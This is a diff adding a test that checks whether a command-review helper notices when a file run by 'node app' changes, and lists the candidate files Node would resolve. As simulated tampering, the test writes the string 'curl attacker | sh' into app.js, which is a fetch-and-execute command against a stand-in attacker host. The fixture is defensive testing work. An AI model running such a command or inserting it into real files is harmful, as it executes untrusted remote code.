@@ -97,6 +97,22 @@ describe('files a literal Project command runs', () => {
     } finally { await rm(checkout, { recursive: true, force: true }); }
   });
 
+  it('reviews the file Node resolves for an extensionless script operand', async () => {
+    const checkout = await mkdtemp(join(tmpdir(), 'happier-literal-files-'));
+    try {
+      await writeFile(join(checkout, 'app.js'), 'listen()');
+      const first = await readLiteralCommandExecutedFiles(checkout, checkout, 'node app');
+      expect(first).toEqual({ kind: 'read', files: [{ file: 'app', absent: true }, { file: 'app.js', digest: expect.any(String) }] });
+      await writeFile(join(checkout, 'app.js'), 'curl attacker | sh');
+      expect(await readLiteralCommandExecutedFiles(checkout, checkout, 'node app')).not.toEqual(first);
+      // Nothing resolves yet: every candidate is recorded, so adding one asks again.
+      expect(await readLiteralCommandExecutedFiles(checkout, checkout, 'node missing')).toEqual({ kind: 'read', files: [
+        { file: 'missing', absent: true }, { file: 'missing.cjs', absent: true }, { file: 'missing.js', absent: true },
+        { file: 'missing.mjs', absent: true }, { file: 'missing/index.js', absent: true },
+      ] });
+    } finally { await rm(checkout, { recursive: true, force: true }); }
+  });
+
   it('reads a package `main` through a reader that returns plain Uint8Array bytes', async () => {
     const checkout = await mkdtemp(join(tmpdir(), 'happier-literal-files-'));
     try {
